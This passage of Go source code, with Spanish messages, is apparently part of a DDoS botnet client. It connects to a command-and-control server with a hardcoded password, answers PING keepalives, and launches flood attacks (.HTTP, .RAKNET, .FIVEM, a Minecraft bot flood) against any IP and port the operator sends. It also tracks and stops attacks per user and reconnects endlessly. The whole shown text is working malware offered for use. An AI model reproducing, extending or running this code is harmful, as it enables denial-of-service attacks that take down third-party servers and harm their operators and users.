		attackFIVEM(ip, port, secs, stopChan)
	case ".RAKNET":
		attackRakNet(ip, port, secs, stopChan)
	case ".HTTP":
		attackHTTP(ip, port, secs, stopChan)
	default:
		fmt.Printf("[!] Método desconocido: %s\n", method)
	}
}

func startAttack(method string, ip string, port int, duration int, username string) {
	stopChan := make(chan bool)

	attacksMu.Lock()
	if attacks[username] == nil {
		attacks[username] = []*Attack{}
	}
	attack := &Attack{
		Method:   method,
		IP:       ip,
		Port:     port,
		Duration: duration,
		Username: username,
		StopChan: stopChan,
		Active:   true,
	}
	attacks[username] = append(attacks[username], attack)
	attacksMu.Unlock()

	fmt.Printf("[ATTACK] %s iniciado %s en %s:%d por %ds\n", username, method, ip, port, duration)

	go func() {
		if method == ".MCBOT" {
			return
		}
		lunchAttack(method, ip, port, duration, stopChan)

		attacksMu.Lock()
		attack.Active = false
		attacksMu.Unlock()
	}()
}

func stopAttacks(username string) {
	attacksMu.Lock()
	defer attacksMu.Unlock()

	if attacks[username] == nil {
		return
	}

	for _, attack := range attacks[username] {
		if attack.Active {
			close(attack.StopChan)
			attack.Active = false
		}
	}
	attacks[username] = []*Attack{}
	fmt.Printf("[STOP] Ataques detenidos para %s\n", username)
}

// ─── CONEXIÓN AL C2 ──────────────────────────────────────────────────────────
func connectToC2() {
	for {
		fmt.Printf("[*] Conectando a %s:%d...\n", C2_ADDRESS, C2_PORT)

		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", C2_ADDRESS, C2_PORT), 10*time.Second)
		if err != nil {
			fmt.Printf("❌ Error: %v\n", err)
			time.Sleep(RECONNECT_DELAY)
			continue
		}

		fmt.Println("[+] Conectado!")

		buffer := make([]byte, 1024)
		authStep := 0

		for authStep < 2 {
			conn.SetReadDeadline(time.Now().Add(10 * time.Second))
			n, err := conn.Read(buffer)
			if err != nil {
				break
			}

			data := string(buffer[:n])

			if strings.Contains(data, "Username") && authStep == 0 {
				conn.Write([]byte(getArchitecture() + "\n"))
				authStep = 1
			} else if strings.Contains(data, "Password") && authStep == 1 {
				password := []byte{0xff, 0xff, 0xff, 0xff, 0x3d}
				conn.Write(password)
				conn.Write([]byte("\n"))
				authStep = 2
			}
		}

		if authStep < 2 {
			conn.Close()
			fmt.Println("❌ Auth failed")
			time.Sleep(RECONNECT_DELAY)
			continue
		}

		fmt.Println("✅ Autenticado!")

		for {
			conn.SetReadDeadline(time.Now().Add(10 * time.Second))
			n, err := conn.Read(buffer)
			if err != nil {
				if ne, ok := err.(net.Error); ok && ne.Timeout() {
					conn.Write([]byte("PONG\n"))
					continue
				}
				break
			}

			data := strings.TrimSpace(string(buffer[:n]))
			if data == "" {
				continue
			}

			if data == "PING" {
				conn.Write([]byte("PONG\n"))
				continue
			}

			args := strings.Fields(data)
			if len(args) == 0 {
				continue
			}

			command := strings.ToUpper(args[0])

			switch command {
			case "STOP":
				if len(args) > 1 {
					username := args[1]
					stopAttacks(username)
					if username == "MCBOT" || strings.Contains(username, "MCBOT") {
						stopMCBot()
					}
					if strings.ToUpper(username) == "ALL" {
						attacksMu.Lock()
						for user, attackList := range attacks {
							for _, attack := range attackList {
								if attack.Active {
									close(attack.StopChan)
									attack.Active = false
								}
							}
							attacks[user] = []*Attack{}
						}
						attacksMu.Unlock()
						stopMCBot()
						fmt.Println("[STOP] Todos los ataques detenidos")
					}
				} else {
					attacksMu.Lock()
					for user, attackList := range attacks {
						for _, attack := range attackList {
							if attack.Active {
								close(attack.StopChan)
								attack.Active = false
							}
						}
						attacks[user] = []*Attack{}
					}
					attacksMu.Unlock()
					stopMCBot()
					fmt.Println("[STOP] Todos los ataques detenidos")
				}

			case ".MCBOT":
				if len(args) >= 9 {
					host := args[1]
					port, _ := strconv.Atoi(args[2])
					nombre := args[3]
					cantidad, _ := strconv.Atoi(args[4])
					tiempo, _ := strconv.Atoi(args[5])
					registerCmd := args[6]
					mensajes := args[7]
					intervalo, _ := strconv.Atoi(args[8])

					go startMCBotAttack(host, port, nombre, cantidad, tiempo, registerCmd, mensajes, intervalo)
				}

			default:
				if len(args) >= 4 {
					method := command
					ip := args[1]
					port, _ := strconv.Atoi(args[2])
					secs, _ := strconv.Atoi(args[3])
					username := "default"
					if len(args) >= 5 {
						username = args[4]
					}

					startAttack(method, ip, port, secs, username)
				}
			}
		}

		conn.Close()
		fmt.Printf("[*] Reintentando en %s...\n", RECONNECT_DELAY)
		time.Sleep(RECONNECT_DELAY)
	}
}

// ─── MAIN ─────────────────────────────────────────────────────────────────────
func main() {
	mathrand.Seed(time.Now().UnixNano())

	fmt.Println("[*] Iniciando payload Go...")

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt)
	go func() {
		<-sigChan
		fmt.Println("\n🛑 Detenido")
		os.Exit(0)
	}()

	mcbotStopMu.Lock()
	mcbotStop = make(chan bool)
	mcbotRunning = false
	mcbotStopMu.Unlock()

	connectToC2()
}
